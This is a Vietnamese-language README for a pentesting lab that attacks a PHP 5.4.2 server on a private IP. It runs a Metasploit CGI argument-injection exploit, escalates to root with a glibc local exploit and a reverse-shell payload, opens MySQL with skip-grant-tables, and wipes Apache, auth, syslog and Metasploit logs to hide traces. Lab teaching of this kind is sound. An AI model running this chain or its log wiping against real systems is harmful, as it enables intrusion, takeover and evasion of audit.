# PHP 5.4 Vulnerability and Privilege Escalation Lab

Dự án này mô phỏng việc khai thác lỗ hổng trong PHP 5.4.2 để thực hiện leo thang đặc quyền sử dụng Metasploit và các công cụ pentesting khác. Lab bao gồm khai thác một máy chủ web dễ bị tấn công và leo thang đặc quyền từ tài khoản người dùng giới hạn lên quyền root.

### ***Mục lục***

[1. Lỗ hổng PHP là gì?](#1)

[2. Leo thang đặc quyền là gì?](#2)

[3.	Tại sao leo thang đặc quyền quan trọng trong tấn công?](#3)

[4. Chi tiết các bước trong Lab](#4)

- [4.1.	Quét máy chủ web](#4.1)

- [4.2.	Khai thác lỗ hổng PHP CGI ](#4.2)

- [4.3. Nâng cấp lên phiên Meterpreter ](#4.3)

- [4.4. Leo thang đặc quyền ](#4.3)

- [4.5. Truy cập cơ sở dữ liệu ](#4.3)

- [4.6. Xóa dấu vết ](#4.3)




<a name = '1'></a>
# 1.	Lỗ hổng PHP là gì?

**Lỗ hổng PHP** xuất hiện khi phiên bản PHP chứa các lỗi bảo mật có thể bị khai thác. **PHP 5.4.2** có lỗ hổng **PHP CGI Argument Injection**, cho phép kẻ tấn công thực thi mã từ xa mà không cần xác thực. Một số dạng lỗ hổng trong PHP bao gồm:
- **Remote Code Execution (RCE)**: Cho phép thực thi mã từ xa.
- **Local File Inclusion (LFI)**: Truy cập tệp tin trên máy chủ.
- **SQL Injection**: Tấn công cơ sở dữ liệu thông qua truy vấn SQL độc hại.

---


<a name = '2'></a>
# 2.	Leo thang đặc quyền là gì?

**Leo thang đặc quyền** là quá trình nâng quyền từ tài khoản người dùng bình thường lên tài khoản **quản trị** (root). Điều này cho phép kẻ tấn công có toàn quyền kiểm soát hệ thống:
- **Leo thang ngang**: Truy cập tài khoản người dùng khác.
- **Leo thang dọc**: Nâng quyền từ người dùng thường lên root.

---

<a name = '3'></a>
# 3.	Tại sao leo thang đặc quyền quan trọng trong tấn công

**Leo thang đặc quyền** giúp kẻ tấn công có thể:
- **Kiểm soát toàn bộ hệ thống**: Thay đổi, xóa dữ liệu hoặc cài đặt mã độc.
- **Duy trì quyền truy cập**: Thiết lập **backdoor** để duy trì quyền truy cập.
- **Tấn công sâu hơn**: Truy cập cơ sở dữ liệu và các thành phần khác.

---

<a name = '4'></a>
# 4.	Chi tiết các bước trong Lab

<a name = '4.1'></a>
## Bước 1: Quét máy chủ web
Sử dụng lệnh **Nmap** để xác định phiên bản PHP và phát hiện lỗ hổng.

```bash
nmap -p 80 --script=http-php-version 192.168.40.128
```

Kết quả: Quét phát hiện máy chủ web đang chạy **PHP 5.4.2**.

---

<a name = '4.2'></a>
## 4.2.	Khai thác lỗ hổng PHP CGI
1. Khởi động Metasploit và tìm kiếm lỗ hổng:
   ```bash
   msf6 > search php cgi
   ```

2. Chọn và cấu hình khai thác:
   ```bash
   use exploit/unix/webapp/php_cgi_arg_injection
   ```

3. Đặt IP của máy chủ web mục tiêu:
   ```bash
   set rhosts 192.168.40.128
   ```

4. Chạy khai thác để có quyền truy cập shell:
   ```bash
   run
   ```

Kết quả: Đã truy cập thành công với quyền **www-data**.

---

<a name = '4.3'></a>
## 4.3.	Nâng cấp lên phiên Meterpreter
1. Kiểm tra các phiên hoạt động:
   ```bash
   sessions
   ```

2. Nâng cấp lên phiên Meterpreter:
   ```bash
   session -u [session_id]
   ```

3. Tương tác với phiên Meterpreter:
   ```bash
   sessions -i [session_id]
   ```

Kết quả: Nâng cấp thành công lên Meterpreter.

---

<a name = '4.4'></a>
## 4.3. Leo thang đặc quyền

Sử dụng **Metasploit's Local Exploit Suggester** để tìm cách leo thang đặc quyền.

1. Dùng module **local exploit suggester**:
   ```bash
   use post/multi/recon/local_exploit_suggester
   ```

2. Chạy module để tìm khai thác khả thi:
   ```bash
   run
   ```

3. Khai thác lỗ hổng **glibc_ld_audit_dso_load_priv_esc**:
   ```bash
   use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
   ```

4. Đặt các tùy chọn cần thiết:
   ```bash
   set session [session_id]
   set LHOST [địa_chỉ_ip_của_bạn]
   set PAYLOAD linux/x64/shell/reverse_tcp
   ```

5. Chạy khai thác:
   ```bash
   run
   ```

Kết quả: Đã leo thang thành công lên **root**.

---

<a name = '4.5'></a>
## 4.3.	Truy cập cơ sở dữ liệu

1. Dừng dịch vụ MySQL:
   ```bash
   /etc/init.d/mysql stop
   ```

2. Khởi động MySQL mà không yêu cầu mật khẩu:
   ```bash
   mysqld_safe --skip-grant-tables &
   ```

3. Truy cập cơ sở dữ liệu qua **phpMyAdmin** hoặc dòng lệnh.

4. Thay đổi mật khẩu hoặc thêm người dùng mới trong cơ sở dữ liệu.

---
<a name = '4.6'></a>
## 4.3.	Xóa dấu vết

Để xóa dấu vết sau khi khai thác, cần xóa log hệ thống và log web server.

1. Xóa log Apache hoặc Nginx:
   ```bash
   echo > /var/log/apache2/access.log
   echo > /var/log/apache2/error.log
   ```

2. Xóa log hệ thống:
   ```bash
   echo > /var/log/auth.log
   echo > /var/log/syslog
   ```

3. Xóa log của Metasploit:
   ```bash
   rm -rf ~/.msf4/logs/
   ```

Kết quả: Các file log đã bị xóa.

---



